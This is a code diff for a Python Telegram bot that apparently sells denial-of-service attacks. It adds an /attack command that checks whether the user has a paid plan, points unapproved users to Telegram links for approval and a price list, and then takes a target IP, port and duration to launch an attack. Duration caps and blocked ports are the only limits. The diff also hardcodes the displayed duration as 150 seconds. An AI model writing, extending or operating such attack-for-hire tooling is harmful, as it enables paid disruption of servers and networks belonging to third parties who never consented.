@@ -1893,25 +1893,64 @@ def approve_or_disapprove_user(message):
 
 
 # Initialize attack flag, duration, start time, and initiator's user ID
+bot.attack_in_progress = False
+bot.attack_duration = 0
+bot.attack_start_time = 0
+bot.attack_initiator = None
+
+
+# Your initial settings, bot initialization, etc.
+
+@bot.message_handler(commands=['attack'])
+def handle_attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    markup = types.InlineKeyboardMarkup()
+    button1 = types.InlineKeyboardButton(text="🔥 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗡𝗼𝘄 𝗡𝗼𝘄 🔥", url="https://t.me/blackhostbypass")
+    button2 = types.InlineKeyboardButton(text="💰 𝗮𝗻𝗱 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 𝗛𝗲𝗿𝗲 💰", url="https://t.me/blackhostbaba")
+    markup.add(button1)
+    markup.add(button2)
+
+    try:
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data.get('plan', 0) == 0:
+            bot.send_message(
+                chat_id,
+                "*❌ Access Denied! ❌*\n\n*You are not approved to use this bot.*\n\nApproval required. Contact the owner [@blackhostbypass] 🔒",
+                parse_mode='Markdown',
+                reply_markup=markup)
+            return
+
+        if bot.attack_in_progress:
+            remaining_time = int(bot.attack_duration - (time.time() - bot.attack_start_time))
+            bot.send_message(
+                chat_id,
+                f"*⚠️ Hold on! The bot is currently in another attack.*\n\n*Remaining Time: {remaining_time} seconds.*\n\n*Please wait patiently.*",
+                parse_mode='Markdown')
+            return
+
+        bot.send_message(
+            chat_id,
+            "*🔥 Ready to launch an attack? 🔥*\n\n*Provide the target IP, port, and duration in seconds.*\n\nExample: 167.67.25 6296 150",
+            parse_mode='Markdown')
+        bot.register_next_step_handler(message, process_attack_command)
+
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+
 def process_attack_command(message):
     try:
         args = message.text.split()
-        
-        # Check if there are 2 or 3 arguments (IP, Port, Duration)
-        if len(args) < 2 or len(args) > 3:
+        if len(args) != 3:
             bot.send_message(
                 message.chat.id,
-                "*❌ Error! ❌ Incorrect format.*\n\n*Provide the correct data: Target IP, Target Port, and optionally Duration in Seconds.*\n\nExample: `167.67.25 6296 180`",
+                "*❌ Error! ❌ Incorrect format.*\n\n*Provide the correct data: Target IP, Target Port, and Duration in Seconds.*",
                 parse_mode='Markdown')
             return
-        
-        # Parse target IP and port
-        target_ip, target_port = args[0], int(args[1])
-        
-        # Set default duration if not provided
-        duration = int(args[2]) if len(args) == 3 else 150  # Default to 300 seconds
 
-        # Check for blocked port
+        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
+
         if target_port in blocked_ports:
             bot.send_message(
                 message.chat.id,
@@ -1919,15 +1958,13 @@ def process_attack_command(message):
                 parse_mode='Markdown')
             return
 
-        # Check for duration limit
-        if duration >= 180:
+        if duration >= 150:
             bot.send_message(
                 message.chat.id,
-                "*⏳ Maximum duration is 180 seconds! ⏳*\n\n*Shorten the duration and try again.*",
+                "*⏳ Maximum duration is 150 seconds! ⏳*\n\n*Shorten the duration and try again.*",
                 parse_mode='Markdown')
             return
 
-        # Set attack parameters
         bot.attack_in_progress = True
         bot.attack_duration = duration
         bot.attack_start_time = time.time()
@@ -1942,7 +1979,7 @@ def process_attack_command(message):
             f"*⚔️ Attack Launched! ⚔️*\n\n"
             f"*Target Host: {target_ip}*\n"
             f"*Target Port: {target_port}*\n"
-            f"*Duration: {duration} seconds*\n\n"
+            f"*Duration: {150} seconds*\n\n"
             "*Let the chaos begin! 🔥 Inflame the battlefield! ⚡ Clear the scene with your hands! 💥 Goal: Clear hits and make a mark! 🎯*"
         )
 
@@ -1956,7 +1993,6 @@ def process_attack_command(message):
 
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
-
 
 
 @bot.callback_query_handler(func=lambda call: call.data == "stop_attack")
